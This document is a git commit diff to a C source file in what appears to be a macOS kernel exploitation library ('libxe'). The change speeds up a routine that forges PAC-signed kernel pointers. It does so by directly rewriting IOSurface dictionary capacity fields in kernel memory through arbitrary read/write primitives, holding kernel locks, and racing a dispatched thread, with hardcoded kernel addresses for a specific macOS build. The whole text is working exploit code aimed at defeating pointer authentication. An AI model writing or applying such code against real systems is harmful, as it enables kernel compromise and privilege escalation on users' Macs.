3f74bd1bdd3cf779160bf3eafaf0cf5e7e0adc69
Sreejith Krishnan R <hello.sreejith@pm.me>
2022-03-13 21:32:46 -0700

    Optimize pacda speed

--- libxe/util/pacda.c
+++ libxe/util/pacda.c
@@ -9,6 +9,7 @@
 #include <IOKit/IOKitLib.h>
 #include <IOSurface/IOSurface.h>
 
+#include "xnu/proc.h"
 #include "xnu/thread.h"
 #include "util/pacda.h"
 #include "util/ptrauth.h"
@@ -20,8 +21,13 @@
 #include "util/assert.h"
 #include "util/log.h"
 #include "util/misc.h"
+#include "iokit/os_dictionary.h"
+#include "iokit/io_surface.h"
 
 #include "macos_params.h"
+
+#define KALLOC_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 3 / 16)
+#define KERNEL_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 64 / 16)
 
 #if MACOS_VERSION == v21E5212f && MACOS_KERNEL_VARIANT == T6000
 #define LR_ENSURE_CAPACITY_KFREE 0xfffffe0007920b98
@@ -65,24 +71,35 @@ void xe_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start,
     CFRelease(dict);
 }
 
-void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
-    IOSurfaceDecrementUseCount(surface);
+// faster way to increase surface props dict capacity to KERNEL_MAP_SWITCH_CAPACITY
+// than increasing capacity by adding values using IOSurfaceAddValues
+void xe_util_pacda_prepare_surface_for_switch(IOSurfaceRef surface_ref, uintptr_t surface) {
+    uint32_t new_capacity = KALLOC_MAP_SWITCH_CAPACITY;
+    uintptr_t dict = xe_kmem_read_ptr(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
+    uint32_t current_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
+    uint32_t current_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
+    xe_assert_cond(new_capacity, >, current_capacity);
+    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, new_capacity);
+    xe_assert_cond(current_count, <=, current_capacity);
+    int diff = current_capacity - current_count + 1;
+    xe_util_pacda_io_surface_add_values(surface_ref, current_count, diff);
+    
+    current_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
+    xe_assert_cond(current_capacity, ==, new_capacity);
+    current_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
+    xe_assert_cond(current_count, <=, current_capacity);
+    
+    diff = current_capacity - current_count;
+    xe_util_pacda_io_surface_add_values(surface_ref, current_count, diff);
+    uint32_t updated_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
+    uint32_t updated_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
+    xe_assert_cond(current_capacity, ==, updated_capacity);
+    xe_assert_cond(updated_count, ==, updated_capacity);
+    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, KERNEL_MAP_SWITCH_CAPACITY);
 }
 
-int xe_util_pacda_find_thread_with_state(uintptr_t proc, int state, uintptr_t* ptr_out) {
-    uintptr_t task = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_TASK_OFFSET));
-    
-    uintptr_t thread = xe_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
-    while (thread != 0 && thread != task + TYPE_TASK_MEM_THREADS_OFFSET) {
-        int thread_state = xe_kmem_read_int32(thread, TYPE_THREAD_MEM_STATE_OFFSET);
-        if (thread_state == state) {
-            *ptr_out = thread;
-            return 0;
-        }
-        thread = xe_kmem_read_uint64(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET);
-    }
-    
-    return ENOENT;
+void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
+    IOSurfaceDecrementUseCount(surface);
 }
 
 uintptr_t xe_util_pacda_find_ptr(uintptr_t base, char* data, size_t data_size, uintptr_t ptr, uintptr_t mask) {
@@ -105,6 +122,7 @@ uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
 }
 
 int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
+    proc = xe_xnu_proc_current_proc();
     xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
     
     uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
@@ -113,12 +131,11 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     
     char* stack = NULL;
     xe_util_lck_rw_t util_lck_rw = NULL;
-    IOSurfaceRef surface = xe_util_pacda_iosurface_create();
-    if (!surface) {
-        return ENOMEM;
-    }
     
-    xe_util_pacda_io_surface_add_values(surface, 0, KALLOC_TO_KERNEL_MAP_SWITCH_LEN - 1);
+    uintptr_t surface;
+    IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
+    xe_util_pacda_prepare_surface_for_switch(surface_ref, surface);
+    
     util_lck_rw = xe_util_lck_rw_lock_exclusive(proc, kalloc_map_lck);
     
     uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
@@ -127,7 +144,7 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     dispatch_async(xe_dispatch_queue(), ^() {
         *waiting_thread = xe_xnu_thread_current_thread();
         dispatch_semaphore_signal(sem_add_value_start);
-        xe_util_pacda_io_surface_add_values(surface, KALLOC_TO_KERNEL_MAP_SWITCH_LEN, 1);
+        xe_util_pacda_io_surface_add_values(surface_ref, KERNEL_MAP_SWITCH_CAPACITY, 1);
         dispatch_semaphore_signal(sem_add_value_complete);
     });
     
@@ -186,8 +203,8 @@ exit:
     if (util_lck_rw) {
         xe_util_lck_rw_lock_done(&util_lck_rw);
     }
-    if (surface) {
-        xe_util_pacda_io_surface_destroy(surface);
+    if (surface_ref) {
+        xe_util_pacda_io_surface_destroy(surface_ref);
     }
     if (stack) {
         free(stack);
